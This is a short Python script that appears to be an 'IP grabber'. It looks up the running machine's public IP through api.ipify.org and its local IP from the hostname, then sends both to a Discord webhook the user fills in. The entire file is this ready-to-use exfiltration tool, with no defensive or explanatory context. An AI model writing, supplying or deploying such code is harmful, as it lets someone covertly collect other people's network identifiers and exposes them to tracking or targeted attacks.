import socket
from requests import get
import requests
from discord import RequestsWebhookAdapter
from discord import Webhook as WebHook

webhook = "YOUR WEBHOOK" #Put your webhook here
webhook = WebHook.from_url(webhook, adapter=RequestsWebhookAdapter())

PubIP = get('https://api.ipify.org').text
LocIP = socket.gethostbyname(socket.gethostname())

webhook.send("Public IP:")
webhook.send(PubIP)
webhook.send("Local IP:")
webhook.send(LocIP)